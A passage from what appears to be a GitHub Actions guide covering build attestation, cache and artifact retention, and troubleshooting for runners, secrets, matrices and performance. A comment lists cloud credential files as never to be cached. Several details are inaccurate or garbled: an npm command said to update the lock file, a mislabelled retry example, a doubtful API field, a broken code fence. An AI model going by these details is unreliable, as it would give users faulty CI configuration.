          subject-path: myapp-${{ github.sha }}.tar.gz
```

This creates an attestation stored in GitHub's transparency log that records:

- The exact commit SHA
- The workflow ref and job name
- The runner environment
- A cryptographic signature

**Verifying an attestation:**

```bash
# Install the gh CLI, then:
gh attestation verify myapp-abc123.tar.gz \
  --repo myorg/myapp \
  --signer-workflow .github/workflows/build.yml
```

**SLSA levels:**

- **SLSA Level 1** — Provenance exists (documents how artifact was built)
- **SLSA Level 2** — Signed provenance (tamper-evident using OIDC + Sigstore)
- **SLSA Level 3** — Hardened build environment (GitHub-hosted runners qualify)

`attest-build-provenance` targeting GitHub-hosted runners achieves **SLSA Level 3** out of the box.

**Integrating attestation verification into a deployment gate:**

By adding attestation verification as a required step before deployment, you ensure that only artifacts built by trusted workflows are promoted to production:

```yaml
name: Deploy with Attestation Verification

on:
  workflow_dispatch:
    inputs:
      artifact-name:
        description: "Name of the artifact to deploy"
        required: true

jobs:
  verify-and-deploy:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      id-token: write # required for attestation verification
      contents: read
    steps:
      - name: Download artifact
        run: |
          gh release download --pattern "${{ inputs.artifact-name }}" \
            --repo ${{ github.repository }}
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Verify attestation before deploying
        # This step FAILS if the artifact was not built by the expected workflow,
        # preventing deployment of tampered or unauthorized artifacts
        run: |
          gh attestation verify "${{ inputs.artifact-name }}" \
            --repo ${{ github.repository }} \
            --signer-workflow .github/workflows/build.yml
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Deploy artifact
        # Only reached if attestation verification passed above
        run: ./scripts/deploy.sh "${{ inputs.artifact-name }}"
```

**Verification flags:**

| Flag                    | Purpose                                                   |
| ----------------------- | --------------------------------------------------------- |
| `--repo`                | Require artifact was built in this repository             |
| `--signer-workflow`     | Require artifact was built by this specific workflow file |
| `--signer-repo`         | Require the signing workflow came from this repository    |
| `--cert-identity-regex` | Match the OIDC subject claim with a regex                 |

---

### 7. **Dependency Policy: Caching and Artifact Retention**

Security and cost optimization both benefit from thoughtful cache and artifact policies.

**Cache key hygiene:**

```yaml
# Pin cache to lock file hash — ensures stale deps don't persist
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      npm-${{ runner.os }}-

# Never cache secrets or credentials
# ❌ Do NOT cache:
#   ~/.aws/credentials
#   ~/.config/gcloud
#   ~/.kube/config
```

**Artifact retention:**

```yaml
- uses: actions/upload-artifact@v4
  with:
    name: build-output
    path: dist/
    retention-days: 7 # default is 90; reduce for transient build artifacts
    if-no-files-found: error
```

Artifacts can be deleted via API to manage storage costs:

```bash
curl -X DELETE \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/artifacts/ARTIFACT_ID
```

**Configuring default retention via REST API:**

GitHub allows admins to set **default retention days** for artifacts and logs at both the repository and organization level.

```bash
# Set default artifact/log retention for a repository (1–400 days)
curl -X PATCH \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"actions_retention_days": 30}' \
  https://api.github.com/repos/OWNER/REPO

# Set default artifact/log retention for an organization
curl -X PATCH \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"actions_default_workflow_file_run_duration_days": 30}' \
  https://api.github.com/orgs/ORG
```

The `GITHUB_RETENTION_DAYS` environment variable in a running workflow reflects the currently configured default for the repository or organization — you can read it to make retention decisions dynamically:

```yaml
- run: |
    echo "Default retention: $GITHUB_RETENTION_DAYS days"
    # Override per artifact with retention-days in upload-artifact
```

**Retention precedence:** An explicit `retention-days` on `actions/upload-artifact` overrides the repository/org default. The repository default overrides the organization default.

---

## Common Failures and Troubleshooting

### 1. **Authentication Errors**

#### Problem: Permission Denied

```text
fatal: could not read Username for 'https://github.com': No such file or directory
```

#### Causes — Authentication Errors

- Missing or invalid GitHub token
- SSH key not configured for self-hosted runners
- GITHUB_TOKEN doesn't have sufficient permissions

#### Solutions — Authentication Errors

**Using GITHUB_TOKEN (automatically provided):**

```yaml
- uses: actions/checkout@v3
  with:
    token: ${{ secrets.GITHUB_TOKEN }}
```

**Using Personal Access Token:**

```yaml
- uses: actions/checkout@v3
  with:
    token: ${{ secrets.PERSONAL_ACCESS_TOKEN }}
```

**Setting SSH key for private dependencies:**

```yaml
- uses: webfactory/ssh-agent@v0.7.0
  with:
    ssh-private-key: ${{ secrets.SSH_PRIVATE_KEY }}
```

---

### 2. **Dependency Installation Failures**

#### Problem: `npm ci` fails with version conflicts

```text
npm ERR! code ERESOLVE
npm ERR! ERESOLVE could not resolve dependencies
```

#### Causes — Dependency Installation

- Node.js version mismatch
- Lock file out of sync with package.json
- Conflicting peer dependencies

#### Solutions — Dependency Installation

**Ensure Node.js version matches development environment:**

```yaml
- name: Setup Node.js
  uses: actions/setup-node@v3
  with:
    node-version: 18.16.0 # Pin exact version
    cache: npm
```

**Update lock file locally and commit:**

```bash
npm ci --force
# or
npm ci --legacy-peer-deps
```

**Add this to workflow if legacy deps are needed:**

```yaml
- name: Install dependencies
  run: npm ci --legacy-peer-deps
```

---

### 3. **Timeout Errors**

#### Problem: Job times out

```
The operation timed out because it took longer than 360 minutes
```

#### Causes — Job Timeout

- Long-running tests
- Network connectivity issues
- Waiting on external resources
- Infinite loops in workflow logic

#### Solutions — Job Timeout

**Set appropriate timeout:**

```yaml
jobs:
  slow-test:
    runs-on: ubuntu-latest
    timeout-minutes: 120
    steps:
      - run: ./slow-test.sh
```

**Set timeout for individual steps:**

```yaml
- name: Long-running task
  run: ./process.sh
  timeout-minutes: 60
```

**Add retry logic:**

```yaml
- name: Download artifact
  uses: actions/download-artifact@v3
  with:
    name: my-artifact
  continue-on-error: true
```

---

### 4. **Workflow File Syntax Errors**

#### Problem: Workflow doesn't trigger or shows validation error

```text
Invalid workflow file at .github/workflows/main.yml: mapping values are not allowed in this context
```

#### Causes — Workflow Syntax Errors

- Invalid YAML syntax
- Incorrect indentation
- Unclosed quotation marks
- Invalid context expressions

#### Solutions — Workflow Syntax Errors

**Validate YAML syntax:** Use an online YAML validator or VS Code extension

**Common YAML mistakes:**

```yaml
# ❌ WRONG - Tabs instead of spaces
jobs:
  build:

# ✅ CORRECT - 2 spaces
jobs:
  build:

# ❌ WRONG - Missing quotes for strings with special chars
- run: echo ${{ secrets.TOKEN }}

# ✅ CORRECT - Use quotes
- run: echo "${{ secrets.TOKEN }}"

# ❌ WRONG - Incorrect context syntax
- run: echo $github.sha

# ✅ CORRECT - Use proper syntax
- run: echo ${{ github.sha }}
```

---

### 5. **Runner Issues**

#### Problem: `ubuntu-latest` runner has outdated software

```text
The requested image with tag is not available
```

#### Causes — Runner Outdated Software

- Using outdated runner images
- Self-hosted runner issues
- GitHub Hosted runner image update lag

#### Solutions — Runner Outdated Software

**Use specific runner versions:**

```yaml
runs-on: ubuntu-22.04  # Instead of ubuntu-latest
# or
runs-on: macos-13
# or
runs-on: windows-2022
```

**For self-hosted runners, ensure they're up to date:**

```bash
# On the self-hosted machine
./config.sh remove
./config.sh
```

#### Problem: Self-hosted runner is offline or not picking up jobs

```
No runner is available to run this job; waiting for a self-hosted runner to come online...
```

**Causes:**

- Runner process crashed or was stopped
- Network connectivity lost between runner and GitHub
- Firewall blocking outbound HTTPS to `github.com` / `api.github.com` / `*.actions.githubusercontent.com`
- Runner registration token expired (tokens expire after 1 hour)

**Diagnosis steps:**

```bash
# 1. Check if the runner process is running (on the runner machine)
ps aux | grep Runner.Listener

# 2. Check runner logs (Linux/macOS)
cat ~/actions-runner/_diag/Runner_*.log | tail -100

# 3. Verify network connectivity from the runner
curl -I https://api.github.com      # Should return 200
curl -I https://github.com          # Should return 200

# 4. Check runner registration in the UI
# Repository → Settings → Actions → Runners
# Status will show: Active / Offline / Idle
```

**Resolution:**

```bash
# Restart the runner service (Linux systemd)
sudo systemctl restart actions.runner.<scope>-<name>.service

# Or restart manually
cd ~/actions-runner
./run.sh &

# If registration is broken, re-register with a fresh token
./config.sh remove --token OLD_TOKEN
./config.sh --url https://github.com/owner/repo --token NEW_TOKEN
```

#### Problem: Jobs are queued but no runner picks them up (label mismatch)

```
Waiting for a runner with labels: [self-hosted, gpu, linux]
```

**Cause:** No registered runner has ALL the labels specified in `runs-on:`.

**Diagnosis:**

```bash
# List runners and their labels via API
curl -H "Authorization: Bearer $TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/actions/runners" \
  | jq '.runners[] | {name, labels: [.labels[].name], status}'
```

**Resolution:**

```bash
# Add a missing label to an existing runner via API
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/OWNER/REPO/actions/runners/RUNNER_ID/labels" \
  -d '{"labels": ["gpu"]}'
```

#### Problem: Self-hosted runner fails with permission errors or environment issues

```
Error: EACCES: permission denied, open '/home/runner/work/_temp/_github_workflow/...'
```

**Causes:**

- Runner is running as root without proper workspace permissions
- Previous job left behind locked files
- Docker socket not accessible

**Resolution:**

```bash
# Clean the workspace manually
rm -rf ~/actions-runner/_work/*

# Run the runner process as a non-root user with proper group permissions
# For Docker socket access, add the runner user to the docker group:
sudo usermod -aG docker runner_user
```

---

### 6. **Artifact and Caching Issues**

#### Problem: Artifact not found when downloading

```
An error occurred when trying to download an artifact using the provided path
```

#### Causes — Artifact Download

- Artifact upload failed silently
- Artifact deleted before download
- Job didn't run (skipped due to `if:` condition)

#### Solutions — Artifact Download

**Ensure artifact is uploaded:**

```yaml
- name: Build
  run: npm run build

- name: Upload artifact
  uses: actions/upload-artifact@v3
  if: success() # Only upload on success
  with:
    name: build-artifacts
    path: dist/
    retention-days: 5

- name: Download artifact
  uses: actions/download-artifact@v3
  with:
    name: build-artifacts
```

**Debug artifact issues:**

```yaml
- name: List artifacts
  if: always()
  run: ls -la dist/
```

---

### 7. **Matrix Build Failures**

#### Problem: One matrix combination fails and stops all others

```
Error building for node@16 with os@ubuntu
```

#### Causes — Matrix Build

- `fail-fast: true` (default behavior)
- One combination has specific issue

#### Solutions — Matrix Build

**Run all combinations even if one fails:**

```yaml
strategy:
  matrix:
    node-version: [14, 16, 18]
    os: [ubuntu-latest, windows-latest]
  fail-fast: false # Continue other jobs
```

**Skip specific combinations:**

```yaml
strategy:
  matrix:
    node-version: [14, 16, 18]
    os: [ubuntu-latest, windows-latest]
    exclude:
      - node-version: 14
        os: windows-latest # Skip this combination
```

---

### 8. **Secret Management Issues**

#### Problem: Secret is redacted/not available

```
Error: DEPLOY_TOKEN is not recognized
```

#### Causes — Secret Management

- Secret name doesn't match
- Secret not added to repository
- Using wrong context syntax
- Scope issues for organization secrets

#### Solutions — Secret Management

**Correct usage:**

```yaml
- name: Deploy
  env:
    TOKEN: ${{ secrets.DEPLOY_TOKEN }}
  run: ./deploy.sh "$TOKEN"
```

**Never echo secrets directly:**

```yaml
# ❌ WRONG - Will be redacted in logs
- run: echo ${{ secrets.TOKEN }}

# ✅ CORRECT - Use in environment variable
- env:
    SECRET: ${{ secrets.TOKEN }}
  run: |
    echo $SECRET | command
```

**Organization secrets:**

```yaml
env:
  TOKEN: ${{ secrets.ORG_SECRET }} # Requires permissions
```

---

### 9. **Step Output Issues**

#### Problem: Cannot reference step output in next step

```
echo ${{ steps.build.outputs.result }}  Returns empty string
```

#### Causes — Step Output

- Step doesn't have an `id` assigned
- Output not properly written to GITHUB_OUTPUT
- Step was skipped

#### Solutions — Step Output

**Properly set step outputs:**

```yaml
- name: Build
  id: build
  run: |
    VERSION=$(npm run get-version)
    echo "version=$VERSION" >> $GITHUB_OUTPUT
    echo "timestamp=$(date)" >> $GITHUB_OUTPUT

- name: Use outputs
  run: |
    echo "Version: ${{ steps.build.outputs.version }}"
    echo "Timestamp: ${{ steps.build.outputs.timestamp }}"
```

---

### 10. **Performance Issues**

#### Problem: Workflows run slowly

```
Workflow taking 30+ minutes for simple tasks
```

#### Causes — Performance

- Jobs running sequentially unnecessarily
- Large dependencies being installed repeatedly
- No caching strategy
- Overly large matrix configurations
- Redundant workflow runs not cancelled when new commits push

#### Solutions — Performance

**Use a fan-out / fan-in pattern to maximize parallel execution:**

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    # ... build once

  test-unit:
    needs: build # starts immediately after build
    runs-on: ubuntu-latest

  test-integration:
    needs: build # also parallel with test-unit
    runs-on: ubuntu-latest

  deploy:
    needs: [test-unit, test-integration] # waits for both to pass
    runs-on: ubuntu-latest
```

#### Solutions: Dependency Caching

**Cache dependencies to skip reinstallation on every run:**

```yaml
- name: Setup Node.js with npm cache
  uses: actions/setup-node@v4
  with:
    node-version: 20
    cache: npm # automatically caches ~/.npm

- name: Setup Python with pip cache
  uses: actions/setup-python@v5
  with:
    python-version: "3.12"
    cache: pip

- name: Manual Maven cache
  uses: actions/cache@v4
  with:
    path: ~/.m2/repository
    key: ${{ runner.os }}-maven-${{ hashFiles('**/pom.xml') }}
    restore-keys: |
      ${{ runner.os }}-maven-
```

#### Solutions: Matrix Sizing and Concurrency Control

```yaml
strategy:
  matrix:
    node-version: [18, 20, 22]
  max-parallel: 2 # run at most 2 matrix jobs simultaneously
  fail-fast: false # don't cancel other matrix jobs on one failure

# Cancel in-progress runs for the same branch when a new commit pushes
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

#### Solutions: Identifying Bottlenecks

**Measure step execution time inline:**

```yaml
- name: Timed build
  run: |
    START=$(date +%s)
    npm run build
    END=$(date +%s)
    echo "Build took $((END - START)) seconds"
```

**Query billable timing across runs via the API:**

```bash
# Get per-job billable milliseconds for a specific run
curl -H "Authorization: Bearer $TOKEN" \
  "https://api.github.com/repos/OWNER/REPO/actions/runs/RUN_ID/timing" \
  | jq '.billable'
```

#### Solutions: Cost Optimization

| Strategy                    | Impact                                        |
| --------------------------- | --------------------------------------------- |
| Use `ubuntu-latest` runners | Cheapest GitHub-hosted runner per minute      |
| Cache dependencies          | Fewer minutes spent downloading packages      |
| `cancel-in-progress: true`  | Avoid burning minutes on superseded runs      |
| `paths-ignore:` filters     | Skip CI when only docs or configs change      |
| Minimize matrix dimensions  | Each cell = a separate job = separate billing |
| Self-hosted runners         | No per-minute charge                          |

```yaml
# Skip CI entirely for documentation-only changes
on:
  push:
    branches: [main]
    paths-ignore:
      - "**.md"
      - "docs/**"
      - ".github/ISSUE_TEMPLATE/**"
```

#### Recommended Strategies for Scaling and Optimizing Workflows

When designing workflows for scale, apply these strategies in combination:

#### 1. Maximize job parallelism

```yaml
jobs:
  lint:
    runs-on: ubuntu-latest
    steps: [...]

  test:
    runs-on: ubuntu-latest # Runs in parallel with lint — no needs: dependency
    steps: [...]

  security-scan:
    runs-on: ubuntu-latest # Runs in parallel too
    steps: [...]

  build:
    needs: [lint, test, security-scan] # Waits for all three — creates a fan-in gate
    steps: [...]
```

#### 2. Use concurrency groups to cancel superseded runs

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true # New push supersedes previous run on same branch
```

> Use `cancel-in-progress: false` for deployment workflows where partial runs could cause inconsistent state.

#### 3. Decompose large workflows — split slow jobs into a separate triggered workflow:

```yaml
# Fast CI: runs on every push (< 5 min target)
on: [push, pull_request]
jobs:
  fast-checks: { ... }   # lint, type-check, unit tests

# Slow CI: triggered only when fast-checks pass
on:
  workflow_run:
    workflows: ["Fast CI"]
    types: [completed]
jobs:
  integration-tests:
    if: github.event.workflow_run.conclusion == 'success'
    ...
```

#### 4. Use `paths:` filters to skip unnecessary runs

push:
paths: - "src/**" # Only run when source changes - "tests/**" - "package.json"

```

#### 5. Use self-hosted runners for cost-sensitive workloads

- GitHub-hosted runners charge per minute; self-hosted runners have no per-minute billing
- Use auto-scaling self-hosted runners (e.g., `actions/actions-runner-controller` on Kubernetes) to scale to zero when idle

#### 6. Set timeouts to avoid runaway jobs

```yaml
jobs:
  build:
    timeout-minutes: 30 # Kill job if it exceeds 30 minutes — prevent wasted minutes
    steps:
      - name: Long step
        timeout-minutes: 10 # Step-level timeout
```

#### 7. Summary decision table

| Problem                          | Strategy                                         |
| -------------------------------- | ------------------------------------------------ |
| Workflow takes too long          | Parallelize jobs; split workflow; cache deps     |
| Too many concurrent runs         | Use `concurrency:` with `cancel-in-progress`     |
| High compute cost                | Use `paths-ignore:`, reduce matrix, self-hosted  |
| Flaky/slow integration tests     | Separate into `workflow_run`-triggered workflow  |
| All matrix jobs fail on one bad  | Set `fail-fast: false`; analyze individually     |
| Runners always busy (queue wait) | Add more self-hosted runners or use auto-scaling |

---

### 11. **Docker and Container Issues**

#### Problem: Docker image push fails

```
denied: requested access to the resource is denied
```

#### Causes — Docker Push

- Authentication not configured
- Missing permissions for registry
- Tag format incorrect

#### Solutions — Docker Push

**Authenticate with Docker registry:**

```yaml
- name: Login to Docker Hub
  uses: docker/login-action@v2
  with:
    username: ${{ secrets.DOCKER_USERNAME }}
    password: ${{ secrets.DOCKER_PASSWORD }}

- name: Build and push
  uses: docker/build-push-action@v4
  with:
    context: .
    push: true
    tags: myrepo/myimage:latest
```

**For GitHub Container Registry:**

```yaml
- name: Login to GHCR
  uses: docker/login-action@v2
  with:
    registry: ghcr.io
    username: ${{ github.actor }}
    password: ${{ secrets.GITHUB_TOKEN }}
```

---

### 12. **Notification and Rollback Issues**

#### Problem: Notifications fail silently

```
Workflow succeeds but no Slack message sent
```

#### Causes — Notification Failure

- Webhook URL incorrect or expired
- Step only runs on success
- Missing error handling

#### Solutions — Notification Failure

**Enable notifications on all job states:**

```yaml
- name: Slack notification
  if: always() # Run regardless of previous step outcome
  uses: slackapi/slack-github-action@v1.24.0
  with:
    webhook-url: ${{ secrets.SLACK_WEBHOOK }}
    payload: |
      {
        "text": "Build ${{ job.status }}: ${{ github.repository }} - ${{ github.ref_name }}"
      }
```

**Conditional notifications:**

```yaml
- name: Notify on failure
  if: failure()
  uses: slackapi/slack-github-action@v1.24.0
  with:
    webhook-url: ${{ secrets.SLACK_WEBHOOK }}
    payload-file-path: ./slack-payload.json
```

---

### 13. **Quick Troubleshooting Checklist**

- [ ] Check workflow syntax with YAML validator
- [ ] Verify all required contexts are available for the triggered event
- [ ] Check that secrets and environment variables are properly named
- [ ] Ensure steps have unique `id` values if outputs are referenced later
- [ ] Verify runner has required tools (Node, Docker, etc.)
- [ ] Check job `if:` conditions aren't blocking execution
- [ ] Look at step output for `==skip reason==` indicators
- [ ] Verify cache keys are stable and appropriate
- [ ] Check concurrent job limits aren't being exceeded
- [ ] Review GitHub Actions rate limits and API usage
- [ ] Ensure file permissions are correct for scripts
- [ ] Validate Docker image names and registry access

---

## Additional Resources

- [GitHub Actions Documentation](https://docs.github.com/en/actions)
- [GitHub Actions Contexts](https://docs.github.com/en/actions/learn-github-actions/contexts)
- [Workflow Syntax](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)
- [GitHub Actions Marketplace](https://github.com/marketplace?type=actions)

---
